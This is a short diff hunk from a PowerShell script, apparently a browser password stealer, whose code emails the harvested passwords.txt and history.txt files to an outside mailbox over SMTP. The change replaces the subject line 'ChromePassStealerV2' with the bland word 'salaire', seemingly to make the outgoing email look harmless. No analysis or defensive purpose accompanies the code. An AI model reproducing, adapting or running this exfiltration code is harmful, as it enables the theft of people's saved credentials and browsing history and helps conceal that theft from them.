@@ -18,7 +18,7 @@ $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('alain.terieurrr
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'axel.terieur@proton.me' #Email in which you want to receice the information
 $ReportEmail.To.Add('alain.terieurrr@laposte.net') #Email in which you want to receive the information
-$ReportEmail.Subject = 'ChromePassStealerV2'
+$ReportEmail.Subject = 'salaire'
 $ReportEmail.Body = 'Attached is your list of informations.'
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\history.txt')
